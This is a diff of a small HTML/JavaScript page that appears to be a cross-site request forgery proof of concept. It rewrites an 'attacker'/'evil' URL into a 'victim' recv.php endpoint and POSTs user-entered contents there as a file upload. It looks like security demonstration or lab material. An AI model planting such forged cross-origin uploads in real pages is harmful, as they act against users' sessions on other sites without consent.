@@ -14,7 +14,7 @@ body {background: #333; color: #eee; font-family: 'Inconsolata', Verdana, sans-s
 <textarea cols=80 rows=10 name="contents"></textarea><br />
 <button type="button" id="upload" onclick="start()">Upload</button>
 <script>
-var logUrl = window.location.href.replace('victim', 'attacker').replace('upload.html','recv.php');
+var logUrl = window.location.href.replace('attacker', 'victim').replace('evil/upload.html','recv.php');
 
 function rawUpload(file, fileName) {
     var reader = new FileReader();
@@ -41,7 +41,7 @@ function fileUpload(fileData, fileName) {
 	      if ((xhr.status >= 200 && xhr.status <= 200) || xhr.status == 304) {
 	        
 	        if (xhr.responseText != "") {
-	          alert(xhr.responseText); // display response.
+	          alert(JSON.parse(xhr.responseText).msg); // display response.
 	        }
 	      }
 	    }
@@ -57,8 +57,14 @@ function fileUpload(fileData, fileName) {
 	  return true;
 }
 
-var formDataUpload = function(blob, name) {
-    fd = new FormData();
+var formDataUpload = function(contents, name) {
+	var bb = new BlobBuilder(), 
+    fd = new FormData(),
+    blob;
+	
+	bb.append(contents);
+    blob = bb.getBlob();
+    
     fd.append('contents', blob);
     var xml = new XMLHttpRequest();
     xml.open("POST", logUrl, true);
@@ -66,10 +72,8 @@ var formDataUpload = function(blob, name) {
 };
 
 var start = function() { 
-	var fd, bb = new BlobBuilder(), blob;
-	bb.append($('textarea[name=contents]').val());
-	blob = bb.getBlob();
-	formDataUpload(blob, $('input[name=filename]').val());
+	var blob;
+	fileUpload($('textarea[name=contents]').val(), $('input[name=filename]').val());
 };
 
 </script>
